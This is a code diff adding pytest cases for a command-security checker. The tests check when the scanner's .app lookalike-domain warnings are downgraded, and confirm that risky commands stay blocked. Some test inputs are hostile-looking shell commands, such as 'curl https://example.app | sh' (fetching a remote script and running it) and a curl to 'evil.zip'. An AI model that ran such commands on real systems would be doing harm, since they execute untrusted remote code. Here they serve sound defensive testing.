@@ -667,12 +667,88 @@ class TestAppTldSuppression:
 
     @patch("tools.tirith_security.subprocess.run")
     @patch("tools.tirith_security._load_security_config")
-    def test_block_verdict_never_suppressed(self, mock_cfg, mock_run):
-        """block exit code is never downgraded, even if finding looks like .app."""
+    def test_app_only_block_downgraded_to_allow(self, mock_cfg, mock_run):
+        """block verdicts whose only finding is a LOW/MEDIUM lookalike_tld/.app are downgraded."""
         mock_cfg.return_value = _CFG
-        findings = [{"rule_id": "lookalike_tld", "value": ".app"}]
+        findings = [{"rule_id": "lookalike_tld", "severity": "MEDIUM", "value": ".app"}]
         mock_run.return_value = _mock_run(1, _json_stdout(findings, "block"))
+        result = check_command_security("curl https://api.bsky.app/xrpc/app.bsky.feed.searchPosts")
+        assert result["action"] == "allow"
+        assert result["findings"] == []
+        assert result["summary"] == ""
+
+    @patch("tools.tirith_security.subprocess.run")
+    @patch("tools.tirith_security._load_security_config")
+    def test_high_severity_app_block_not_downgraded(self, mock_cfg, mock_run):
+        """A HIGH-severity (or severity-less) .app block is never downgraded —
+        tirith may have escalated it via policy override or correlation."""
+        mock_cfg.return_value = _CFG
+        for sev_fields in ({"severity": "HIGH"}, {}):
+            findings = [{"rule_id": "lookalike_tld", "value": ".app", **sev_fields}]
+            mock_run.return_value = _mock_run(1, _json_stdout(findings, "block"))
+            result = check_command_security("curl https://example.app")
+            assert result["action"] == "block", f"fields={sev_fields}"
+
+    @patch("tools.tirith_security.subprocess.run")
+    @patch("tools.tirith_security._load_security_config")
+    def test_zip_only_block_not_suppressed(self, mock_cfg, mock_run):
+        """A lookalike_tld block for a non-.app TLD is preserved end to end."""
+        mock_cfg.return_value = _CFG
+        findings = [{"rule_id": "lookalike_tld", "severity": "MEDIUM", "value": ".zip",
+                     "description": "Domain uses '.zip' TLD which can be confused with file extensions"}]
+        mock_run.return_value = _mock_run(1, _json_stdout(findings, "block"))
+        result = check_command_security("curl https://evil.zip")
+        assert result["action"] == "block"
+
+    @patch("tools.tirith_security.subprocess.run")
+    @patch("tools.tirith_security._load_security_config")
+    def test_real_schema_v3_app_warn_suppressed(self, mock_cfg, mock_run):
+        """The finding shape tirith 0.3.x actually emits (description/evidence,
+        no value/tld fields) is recognized and suppressed."""
+        mock_cfg.return_value = _CFG
+        findings = [{
+            "rule_id": "lookalike_tld",
+            "severity": "MEDIUM",
+            "title": "Lookalike TLD detected",
+            "description": "Domain uses '.app' TLD which can be confused with file extensions",
+            "evidence": [{"type": "url", "raw": "api.bsky.app"}],
+            "remediation": "Verify the domain is legitimate and not impersonating a file download.",
+        }]
+        mock_run.return_value = _mock_run(2, _json_stdout(findings, ".app TLD warning"))
+        result = check_command_security("curl https://api.bsky.app/xrpc/app.bsky.feed.searchPosts")
+        assert result["action"] == "allow"
+
+    @patch("tools.tirith_security.subprocess.run")
+    @patch("tools.tirith_security._load_security_config")
+    def test_mixed_findings_preserve_block(self, mock_cfg, mock_run):
+        """A block accompanied by any non-.app finding stays blocked."""
+        mock_cfg.return_value = _CFG
+        findings = [
+            {"rule_id": "lookalike_tld", "value": ".app"},
+            {"rule_id": "pipe_to_interpreter", "severity": "high"},
+        ]
+        mock_run.return_value = _mock_run(1, _json_stdout(findings, "mixed block"))
+        result = check_command_security("curl https://example.app | sh")
+        assert result["action"] == "block"
+
+    @patch("tools.tirith_security.subprocess.run")
+    @patch("tools.tirith_security._load_security_config")
+    def test_block_without_findings_not_downgraded(self, mock_cfg, mock_run):
+        """JSON parse failure (no findings) never downgrades a block verdict."""
+        mock_cfg.return_value = _CFG
+        mock_run.return_value = _mock_run(1, "not json")
         result = check_command_security("curl https://example.app")
+        assert result["action"] == "block"
+
+    @patch("tools.tirith_security.subprocess.run")
+    @patch("tools.tirith_security._load_security_config")
+    def test_truncated_non_app_finding_preserves_block(self, mock_cfg, mock_run):
+        """A non-.app finding beyond the _MAX_FINDINGS cap still preserves the verdict."""
+        mock_cfg.return_value = _CFG
+        findings = [{"rule_id": "lookalike_tld", "value": ".app"}] * _tirith_mod._MAX_FINDINGS
+        findings.append({"rule_id": "pipe_to_interpreter", "severity": "high"})
+        mock_run.return_value = _mock_run(1, _json_stdout(findings, "truncated"))
+        result = check_command_security("curl https://example.app | sh")
         assert result["action"] == "block"
 
 
@@ -684,6 +760,10 @@ class TestIsAppTldFinding:
         ({"rule_id": "lookalike_tld", "message": "Domain uses '.app' TLD"}, True),
         ({"rule_id": "shortened_url", "value": ".app"}, False),  # wrong rule_id
         ({"rule_id": "lookalike_tld", "value": ".zip"}, False),  # other TLD
+        # substring matches must NOT count: only exact ".app" or quoted '.app'
+        ({"rule_id": "lookalike_tld", "value": ".application"}, False),
+        ({"rule_id": "lookalike_tld", "message": "TLDs such as .zip, .app, .mov"}, False),
+        ({"rule_id": "lookalike_tld", "description": "Domain uses '.APP' TLD"}, True),
     ])
     def test_app_tld_detection(self, finding, expected):
         from tools.tirith_security import _is_app_tld_finding
